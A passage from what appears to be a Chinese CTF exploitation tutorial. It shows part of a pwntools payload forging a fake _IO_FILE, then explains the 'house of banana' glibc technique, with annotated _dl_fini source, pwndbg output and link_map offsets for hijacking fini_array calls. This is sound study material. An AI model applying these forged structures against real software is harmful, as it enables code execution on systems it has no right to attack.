</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> fake_IO_FILE<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)                               <span style="color:#6272a4"># _chain</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> fake_IO_FILE<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x88</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(heapbase<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>)                 <span style="color:#6272a4"># _lock = a writable address</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> fake_IO_FILE<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0xa0</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(fake_io_addr<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>)               <span style="color:#6272a4"># _wide_data, rax1_addr</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> fake_IO_FILE<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0xc0</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">1</span>)                               <span style="color:#6272a4"># mode=1</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> fake_IO_FILE<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0xd8</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(libcbase<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2160c0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x10</span>)          <span style="color:#6272a4"># vtable=IO_wfile_jumps+0x10</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">6</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(fake_io_addr<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x40</span>)               <span style="color:#6272a4"># rax2_addr</span>
</span></span></code></pre></div><h2 id="house-of-banana">house of banana</h2>
<p>不是一种攻击IO_FILE的利用手段。程序通过exit退出时，会调用一个名叫 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<ul>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ul>
<p>gdb 常用的指令</p>
<ul>
<li>这是ld.so 文件中的一个地址，因此不能使用libc.sym获得地址</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>p &amp;<span style="color:#ff79c6">(</span>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>p &amp;_rtld_global
</span></span></code></pre></div><p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>。</p>
<ul>
<li>glibc 2.37 后的源码，对比之前的与那吗，发现主要的变化为 <code>_dl_call_fini(l);</code>，跟进函数发现除了输出debugging信息函数变了，其余都没变</li>
<li>link map 使用双向链表连接起来</li>
<li>nmaps 是 <code>maps[]</code> 中元素个数，也就是 <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>建议自己随便写个程序，将其中变量打印出来看看。这里加载下面的注释里</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// pwndbg&gt; p _rtld_global 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define GL(name) _rtld_global._##name
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">_dl_fini</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>  <span style="color:#8be9fd">int</span> do_audit <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">again</span>:
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">for</span> (Lmid_t ns <span style="color:#ff79c6">=</span> GL(dl_nns) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>; ns <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">--</span>ns) {
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* Protect against concurrent loads and unloads.  */</span>
</span></span><span style="display:flex;"><span>    __rtld_lock_lock_recursive(GL(dl_load_lock));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> nloaded <span style="color:#ff79c6">=</span> GL(dl_ns)[ns]._ns_nloaded;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* No need to do anything for empty namespaces or those used for
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">       auditing DSOs.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (nloaded <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>        <span style="color:#ff79c6">||</span> GL(dl_ns)[ns]._ns_loaded<span style="color:#ff79c6">-&gt;</span>l_auditing <span style="color:#ff79c6">!=</span> do_audit
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>    )
</span></span><span style="display:flex;"><span>      __rtld_lock_unlock_recursive(GL(dl_load_lock));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* Now we can allocate an array to hold all the pointers and
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         copy the pointers in.  */</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#6272a4">// nloaded =&gt; 4
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>maps[nloaded];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>l;
</span></span><span style="display:flex;"><span>      assert(nloaded <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> GL(dl_ns)[ns]._ns_loaded <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#6272a4">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	  <span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  直到出现0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">for</span> (l <span style="color:#ff79c6">=</span> GL(dl_ns)[ns]._ns_loaded, i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; l <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>; l <span style="color:#ff79c6">=</span> l<span style="color:#ff79c6">-&gt;</span>l_next)
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Do not handle ld.so in secondary namespaces.  */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// 需要进入这个if线
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (l <span style="color:#ff79c6">==</span> l<span style="color:#ff79c6">-&gt;</span>l_real) {
</span></span><span style="display:flex;"><span>          assert(i <span style="color:#ff79c6">&lt;</span> nloaded);   <span style="color:#6272a4">// 所以说不会超过4个
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>          maps[i] <span style="color:#ff79c6">=</span> l;
</span></span><span style="display:flex;"><span>          l<span style="color:#ff79c6">-&gt;</span>l_idx <span style="color:#ff79c6">=</span> i;
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">++</span>i;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">/* Bump l_direct_opencount of all objects so that they
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">             are not dlclose()ed from underneath us.  */</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">++</span>l<span style="color:#ff79c6">-&gt;</span>l_direct_opencount;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      assert(ns <span style="color:#ff79c6">!=</span> LM_ID_BASE <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> nloaded);  <span style="color:#6272a4">// 过其中一个检查，i==nloaded,也就是全部的if线都要进入。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      assert(ns <span style="color:#ff79c6">==</span> LM_ID_BASE <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> nloaded <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> nloaded <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">// nmaps = 4
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> nmaps <span style="color:#ff79c6">=</span> i;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* Now we have to do the sorting.  We can skip looking for the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         binary itself which is at the front of the search list for
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         the main namespace.  */</span>
</span></span><span style="display:flex;"><span>      _dl_sort_maps(maps, nmaps, (ns <span style="color:#ff79c6">==</span> LM_ID_BASE), <span style="color:#8be9fd;font-style:italic">true</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* We do not rely on the linked list of loaded object anymore
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         from this point on.  We have our own list here (maps).  The
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         various members of this list cannot vanish since the open
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         count is too high and will be decremented in this loop.  So
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         we release the lock so that some code which might be called
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         from a destructor can directly or indirectly access the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         lock.  */</span>
</span></span><span style="display:flex;"><span>      __rtld_lock_unlock_recursive(GL(dl_load_lock));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* &#39;maps&#39; now contains the objects in the right order.  Now
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         call the destructors.  We have to process this array from
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         the front.  */</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#6272a4">// nmaps = 4
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> nmaps; <span style="color:#ff79c6">++</span>i) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>l <span style="color:#ff79c6">=</span> maps[i];   <span style="color:#6272a4">// _ns_loaded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (l<span style="color:#ff79c6">-&gt;</span>l_init_called) {
</span></span><span style="display:flex;"><span>          _dl_call_fini(l);            <span style="color:#6272a4">// 进入这个函数
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>          <span style="color:#6272a4">/* Auditing checkpoint: another object closed.  */</span>
</span></span><span style="display:flex;"><span>          _dl_audit_objclose(l);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Correct the previous increment.  */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">--</span>l<span style="color:#ff79c6">-&gt;</span>l_direct_opencount;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>do_audit <span style="color:#ff79c6">&amp;&amp;</span> GLRO(dl_naudit) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>    do_audit <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> again;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (__glibc_unlikely(GLRO(dl_debug_mask) <span style="color:#ff79c6">&amp;</span> DL_DEBUG_STATISTICS))
</span></span><span style="display:flex;"><span>    _dl_debug_printf(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">runtime linker statistics:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;           final number of relocations: %lu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;final number of relocations from cache: %lu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
</span></span><span style="display:flex;"><span>        GL(dl_num_relocations), GL(dl_num_cache_relocations));
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>}
</span></span></code></pre></div><p>走到 <code>_dl_call_fini</code></p>
<ul>
<li>存在一个函数调用 <code>((fini_t)array[sz])()</code>，map为参数，也就是上面的 <code>GL(dl_ns)[ns]._ns_loaded</code> 和其 next，next-&gt;next&hellip;</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">_dl_call_fini</span>(<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>closure_map) {
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded 和 l_next 指针
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// pwndbg p *(struct link_map *) 上一个指令地址
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>map <span style="color:#ff79c6">=</span> closure_map;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* When debugging print a message first.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (__glibc_unlikely(GLRO(dl_debug_mask) <span style="color:#ff79c6">&amp;</span> DL_DEBUG_IMPCALLS))
</span></span><span style="display:flex;"><span>    _dl_debug_printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">calling fini: %s [%lu]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>, map<span style="color:#ff79c6">-&gt;</span>l_name, map<span style="color:#ff79c6">-&gt;</span>l_ns);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* Make sure nothing happens if we are called twice.  */</span>
</span></span><span style="display:flex;"><span>  map<span style="color:#ff79c6">-&gt;</span>l_init_called <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  ElfW(Dyn) <span style="color:#ff79c6">*</span>fini_array <span style="color:#ff79c6">=</span> map<span style="color:#ff79c6">-&gt;</span>l_info[DT_FINI_ARRAY];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (fini_array <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    ElfW(Addr) <span style="color:#ff79c6">*</span>array <span style="color:#ff79c6">=</span> (ElfW(Addr) <span style="color:#ff79c6">*</span>)(map<span style="color:#ff79c6">-&gt;</span>l_addr <span style="color:#ff79c6">+</span> fini_array<span style="color:#ff79c6">-&gt;</span>d_un.d_ptr);
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    size_t sz <span style="color:#ff79c6">=</span> (map<span style="color:#ff79c6">-&gt;</span>l_info[DT_FINI_ARRAYSZ]<span style="color:#ff79c6">-&gt;</span>d_un.d_val <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span>(ElfW(Addr)));
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 不管什么类型，最后调用的函数地址可以得到
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">while</span> (sz<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) ((fini_t)array[sz])();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* Next try the old-style destructor.  */</span>
</span></span><span style="display:flex;"><span>  ElfW(Dyn) <span style="color:#ff79c6">*</span>fini <span style="color:#ff79c6">=</span> map<span style="color:#ff79c6">-&gt;</span>l_info[DT_FINI];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (fini <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>    DL_CALL_DT_FINI(map, ((<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)map<span style="color:#ff79c6">-&gt;</span>l_addr <span style="color:#ff79c6">+</span> fini<span style="color:#ff79c6">-&gt;</span>d_un.d_ptr));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>主要是函数调用能攻击一下就行，为了更容易的通过if的条件的，我们一般替换链表最后一个 link_map，也就是打第3个linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>这是部分的内容，只截取了我们需要的内容</li>
<li>伪造l_addr, fini_array-&gt;d_un.d_ptr 内容</li>
<li>DT_FINI_ARRAY 为 26，DT_FINI_ARRAYSZ 为 28</li>
<li>因为源码可能比较抽象，不如直接打印出来，这里只截取有用的部分</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p **<span style="color:#ff79c6">(</span>struct link_map **<span style="color:#ff79c6">)</span> 0x7ffff7fbb188
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$5</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_addr</span> <span style="color:#ff79c6">=</span> 140737349943296,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_name</span> <span style="color:#ff79c6">=</span> 0x7ffff7fbb660 <span style="color:#f1fa8c">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_ld</span> <span style="color:#ff79c6">=</span> 0x7ffff7e18bc0,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_next</span> <span style="color:#ff79c6">=</span> 0x7ffff7fbbb90,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_prev</span> <span style="color:#ff79c6">=</span> 0x7ffff7fbb170,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_real</span> <span style="color:#ff79c6">=</span> 0x7ffff7fbb680,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_ns</span> <span style="color:#ff79c6">=</span> 0,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_libname</span> <span style="color:#ff79c6">=</span> 0x7ffff7fbbb10,
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">l_info</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats <span style="color:#bd93f9">25</span> times&gt;, 0x7ffff7e18c10<span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; ptype <span style="color:#ff79c6">((</span>struct link_map **<span style="color:#ff79c6">)</span> 0x7ffff7fbb188 <span style="color:#ff79c6">)</span>-&gt;l_info
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">type</span> <span style="color:#ff79c6">=</span> struct <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>	    Elf64_Sxword d_tag;
</span></span><span style="display:flex;"><span>	    union <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>	        Elf64_Xword d_val;
</span></span><span style="display:flex;"><span>	        Elf64_Addr d_ptr;
</span></span><span style="display:flex;"><span>	    <span style="color:#ff79c6">}</span> d_un;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">}</span> *<span style="color:#ff79c6">[</span>77<span style="color:#ff79c6">]</span>
</span></span></code></pre></div><p>伪造，堆地址 A</p>
<ul>
<li>l = l-&gt;real =&gt; A + 0x28 内容放着堆地址 <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called 不为0，数字随意，根据版本而异。 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>。我测的是0x312</li>
<li><code>map.l_info[26]</code> 不为 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 控制循环次数，一般写成1就行</li>
<li>控制函数执行流 <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>。也就是 <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>偏移是0x110。那么28是0x120</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// l = l-&gt;real
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x28</span> <span style="color:#ff79c6">=</span> fake
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// l-&gt;l_init_called，但是测试后是一个magic num，需要将其余结构体的linkmap 的 l_init_called 打印出来赋值
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x312</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 注意，需要设置 l_next 位置为0才行
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 下面的就比较固定了
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// map.l_info[26]
